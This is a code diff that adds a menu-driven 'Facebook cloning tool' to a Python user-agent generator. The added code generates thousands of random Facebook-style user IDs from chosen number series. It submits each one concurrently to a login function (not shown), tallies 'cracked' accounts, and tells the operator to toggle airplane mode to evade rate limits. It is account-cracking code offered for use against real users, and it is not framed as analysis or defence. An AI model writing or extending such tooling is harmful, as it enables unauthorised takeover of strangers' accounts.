@@ -1,5 +1,10 @@
 import random
 import string
+import random
+import string
+import time
+import os
+from concurrent.futures import ThreadPoolExecutor as tred
 
 ugen = []
 
@@ -405,3 +410,110 @@ print("Samsung UA:", get_samsung_ua()[:80] + "...")
 print("iPhone UA:", get_iphone_ua()[:80] + "...")
 print(f"\nTotal UAs: {len(ugen)}")
 print("To save: save_to_file()")
+
+
+def clear():
+    os.system('clear')
+
+def linex():
+    print('\033[1;37m' + '─' * 50)
+
+def line():
+    print('\033[1;37m' + '─' * 50)
+
+# Global variables for results
+oks = []
+cps = []
+
+def main():
+    clear()
+    print(f'\x1b[38;5;46m[\033[1;97m🔥\x1b[38;5;46m] \033[1;97mFACEBOOK CLONING TOOL 2018-2025')
+    linex()
+    print(f'\x1b[38;5;46m[\033[1;97m1\x1b[38;5;46m] \033[1;97mSERIES SELECTION \x1b[38;5;46m[\x1b[38;5;46mSeries\x1b[38;5;46m/\x1b[38;5;46mBased\x1b[38;5;46m]\033[1;97m')
+    linex()
+    ch = input(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSELECTION \x1b[38;5;46m▶ \033[1;97m')
+
+    if ch in ('1', '01', '11', 'a', 'A'):
+        SERIES_SELECTION()
+    else:
+        print(f'\x1b[38;5;160m[\033[1;97m❌\x1b[38;5;160m] \033[1;97mINVALID SELECTION!')
+        time.sleep(2)
+        main()
+
+def SERIES_SELECTION():
+    user = []
+    clear()
+    print(f'\x1b[38;5;46m[\033[1;97m🔥\x1b[38;5;46m] \033[1;97mSELECT SERIES FOR CLONING:')
+    linex()
+    print(f'\x1b[38;5;46m[\033[1;97m1\x1b[38;5;46m] \033[1;97m1000 Series')
+    print(f'\x1b[38;5;46m[\033[1;97m2\x1b[38;5;46m] \033[1;97m6155 Series')
+    print(f'\x1b[38;5;46m[\033[1;97m3\x1b[38;5;46m] \033[1;97m6156 Series')
+    print(f'\x1b[38;5;46m[\033[1;97m4\x1b[38;5;46m] \033[1;97m6157 Series')
+    linex()
+    
+    series_choice = input(f'\x1b[38;5;46m[\033[1;97m🎯\x1b[38;5;46m] \033[1;97mSELECT SERIES \x1b[38;5;46m▶ \033[1;97m')
+    
+    # Simple series mapping
+    series_map = {
+        '1': '1000',
+        '2': '6155', 
+        '3': '6156',
+        '4': '6157'
+    }
+    
+    if series_choice in series_map:
+        selected_series = series_map[series_choice]
+        START_SERIES_CLONING(selected_series)
+    else:
+        print(f'\x1b[38;5;160m[\033[1;97m❌\x1b[38;5;160m] \033[1;97mINVALID SELECTION!')
+        time.sleep(2)
+        SERIES_SELECTION()
+
+def START_SERIES_CLONING(series_code):
+    user = []
+    clear()
+    
+    print(f'\x1b[38;5;46m[\033[1;97m🔥\x1b[38;5;46m] \033[1;97mSELECTED SERIES: \x1b[38;5;46m{series_code}')
+    print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mEXAMPLE \x1b[38;5;46m ▶ \033[1;97m10000\x1b[38;5;46m|\033[1;97m30000\x1b[38;5;46m|\033[1;97m50000\x1b[38;5;46m|\033[1;97m99999')
+    linex()
+    
+    try:
+        limit = int(input(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSELECTION \x1b[38;5;46m▶ \033[1;97m'))
+    except ValueError:
+        print(f'\x1b[38;5;160m[\033[1;97m❌\x1b[38;5;160m] \033[1;97mINVALID NUMBER!')
+        time.sleep(2)
+        START_SERIES_CLONING(series_code)
+        return
+    
+    linex()
+    
+    # Generate IDs with selected series code (15 digits total)
+    for i in range(limit):
+        if series_code == '1000':
+            # For 1000 series - 11 more digits
+            data = ''.join(random.choice(string.digits) for _ in range(11))
+        else:
+            # For 6155, 6156, 6157 series - 11 more digits  
+            data = ''.join(random.choice(string.digits) for _ in range(11))
+        
+        uid = series_code + data
+        user.append(uid)
+    
+    with tred(max_workers=30) as jihad:
+        clear()
+        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mTOTAL ID \x1b[38;5;46m▶ \033[1;97m{len(user)}')
+        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSERIES CODE \x1b[38;5;46m▶ \033[1;97m{series_code}')
+        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE')
+        linex()
+        for mal in user:
+            uid = mal
+            jihad.submit(login1, uid)
+    
+    line()
+    print(f'\r\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mYOUR SERIES CRACKED HAS BEEN COMPLETED...\x1b[38;5;46m!')
+    linex()
+    print(f"\r\r\r\r\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mTOTAL OK \x1b[38;5;46m▶ \x1b[38;5;46m{len(oks)}")
+    linex()
+    input(f'\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mINTER TO BACK RAN AGAIN...\x1b[38;5;46m!\033[1;37m')
+    main()
+
